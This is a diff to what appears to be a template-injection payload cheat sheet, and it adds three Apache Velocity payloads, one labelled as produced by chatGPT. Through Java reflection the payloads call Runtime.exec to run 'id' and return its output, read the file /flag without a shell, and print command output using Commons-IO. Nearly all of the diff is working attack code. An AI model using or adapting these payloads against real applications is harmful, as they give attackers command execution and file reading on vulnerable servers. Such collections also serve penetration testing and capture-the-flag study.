@@ -259,6 +259,41 @@ A more flexible and stealthy payload that supports base64-encoded commands, allo
 #end
 ```
 
+Payload from chatGPT
+
+```java
+#set($rt = $name.getClass().forName("java.lang.Runtime").getRuntime())
+#set($p = $rt.exec("id"))
+#set($i = $p.getInputStream())
+#set($Scanner = $name.getClass().forName("java.util.Scanner"))
+#set($InputStream = $name.getClass().forName("java.io.InputStream"))
+#set($ctor = $Scanner.getConstructor($InputStream))
+#set($sc = $ctor.newInstance($i))
+#set($sc = $sc.useDelimiter("\\A"))
+#foreach($x in [1])$sc.next()#end
+```
+
+Direct file read without spawning a shell
+
+```java
+#set($Paths = $name.getClass().forName("java.nio.file.Paths"))
+#set($Files = $name.getClass().forName("java.nio.file.Files"))
+#set($p = $Paths.get("/flag"))
+#set($bytes = $Files.readAllBytes($p))
+#set($String = $name.getClass().forName("java.lang.String"))
+#set($ba = $name.getClass().forName("[B"))  ## byte[] class
+#set($ctor = $String.getConstructor($ba))
+$ctor.newInstance($bytes)
+```
+
+If Commons-IO is present (often in Spring Boot apps)
+
+```java
+#set($p = $name.getClass().forName("java.lang.Runtime").getRuntime().exec("id"))
+#set($i = $p.getInputStream())
+${$name.getClass().forName("org.apache.commons.io.IOUtils").toString($i,"UTF-8")}
+```
+
 ---
 
 ## Groovy
